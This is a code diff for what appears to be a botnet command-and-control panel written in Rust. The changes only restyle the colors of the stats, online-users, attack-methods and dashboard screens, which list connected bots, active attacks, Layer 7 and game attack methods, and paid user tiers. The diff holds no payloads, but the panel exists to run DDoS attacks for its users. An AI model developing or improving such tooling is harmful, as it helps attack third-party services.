@@ -111,7 +111,7 @@ pub async fn handle_stats_command(client: &Arc<Client>, state: &Arc<AppState>) -
     client.write(format!("  \x1b[38;5;245mBots Connected  : \x1b[0m{}\n\r", bot_gradient).as_bytes()).await?;
     let client_gradient = apply_gradient(&client_count.to_string(), 39, 51);
     client.write(format!("  \x1b[38;5;245mUsers Connected : \x1b[0m{}\n\r", client_gradient).as_bytes()).await?;
-    let attack_gradient = apply_gradient(&format!("{}/{}", attack_count, state.config.read().await.max_attacks), 39, 51);
+    let attack_gradient = apply_fire_gradient(&format!("{}/{}", attack_count, state.config.read().await.max_attacks));
     client.write(format!("  \x1b[38;5;245mActive Attacks  : \x1b[0m{}\n\r", attack_gradient).as_bytes()).await?;
     client.write(b"\n\r").await?;
     client.set_breadcrumb("Home > Server Stats").await;
@@ -157,8 +157,8 @@ pub async fn handle_online_command(client: &Arc<Client>, state: &Arc<AppState>) 
     } else {
         for c in clients.iter() {
             let level_color = match c.user.get_level() {
-                Level::Owner => 39,
-                Level::Admin => 45,
+                Level::Owner => 196,
+                Level::Admin => 202,
                 Level::Pro => 87,
                 Level::Basic => 195,
             };
@@ -335,14 +335,16 @@ pub async fn handle_methods_command(client: &Arc<Client>, state: &Arc<AppState>)
         let name_gradient = apply_gradient(name, 39, 51);
         client.write(format!("  \x1b[38;5;245m{:<12} : \x1b[0m{}\n\r", name_gradient, desc).as_bytes()).await?;
     }
-    client.write(b"\n\r  \x1b[38;5;51mLayer 7 Methods\x1b[0m\n\r").await?;
+    let l7_title = apply_fire_gradient("Layer 7 Methods");
+    client.write(format!("\n\r  {}\n\r", l7_title).as_bytes()).await?;
     for (name, desc) in l7_methods.iter() {
-        let name_gradient = apply_gradient(name, 51, 87);
+        let name_gradient = apply_gradient(name, 196, 220);
         client.write(format!("  \x1b[38;5;245m{:<12} : \x1b[0m{}\n\r", name_gradient, desc).as_bytes()).await?;
     }
-    client.write(b"\n\r  \x1b[38;5;87mGame Methods\x1b[0m\n\r").await?;
+    let game_title = apply_gradient("Game Methods", 220, 226);
+    client.write(format!("\n\r  {}\n\r", game_title).as_bytes()).await?;
     for (name, desc) in game_methods.iter() {
-        let name_gradient = apply_gradient(name, 87, 123);
+        let name_gradient = apply_gradient(name, 220, 226);
         client.write(format!("  \x1b[38;5;245m{:<12} : \x1b[0m{}\n\r", name_gradient, desc).as_bytes()).await?;
     }
     client.write(b"\n\r").await?;
@@ -377,10 +379,10 @@ pub async fn handle_dashboard_command(client: &Arc<Client>, state: &Arc<AppState
     client.write(format!("  \x1b[38;5;245mConnected Bots  : \x1b[0m{}\n\r", bots_gradient).as_bytes()).await?;
     let users_gradient = apply_gradient(&format!("{}/{}", client_count, state.config.read().await.max_user_connections), 39, 51);
     client.write(format!("  \x1b[38;5;245mConnected Users : \x1b[0m{}\n\r", users_gradient).as_bytes()).await?;
-    let attacks_gradient = apply_gradient(&format!("{}/{}", attack_count, state.config.read().await.max_attacks), 39, 51);
+    let attacks_gradient = apply_fire_gradient(&format!("{}/{}", attack_count, state.config.read().await.max_attacks));
     client.write(format!("  \x1b[38;5;245mActive Attacks  : \x1b[0m{}\n\r", attacks_gradient).as_bytes()).await?;
     client.write(b"\n\r").await?;
-    let active_title = apply_ice_gradient("Active Attacks");
+    let active_title = apply_fire_gradient("Active Attacks");
     client.write(format!("  {}\n\r", active_title).as_bytes()).await?;
     client.write("  \x1b[38;5;240m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[0m\n\r".as_bytes()).await?;
     if attacks.is_empty() {
@@ -406,10 +408,10 @@ pub async fn handle_dashboard_command(client: &Arc<Client>, state: &Arc<AppState
         }
     }
     client.write(b"\n\r").await?;
-    let user_title = apply_ice_gradient("Your Activity");
+    let user_title = apply_fire_gradient("Your Activity");
     client.write(format!("  {}\n\r", user_title).as_bytes()).await?;
     client.write("  \x1b[38;5;240m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[0m\n\r".as_bytes()).await?;
-    let user_attacks_gradient = apply_gradient(&user_attacks.len().to_string(), 39, 51);
+    let user_attacks_gradient = apply_fire_gradient(&user_attacks.len().to_string());
     client.write(format!("  \x1b[38;5;245mYour Active Attacks : \x1b[0m{}\n\r", user_attacks_gradient).as_bytes()).await?;
     client.write(b"\n\r").await?;
     Ok(())
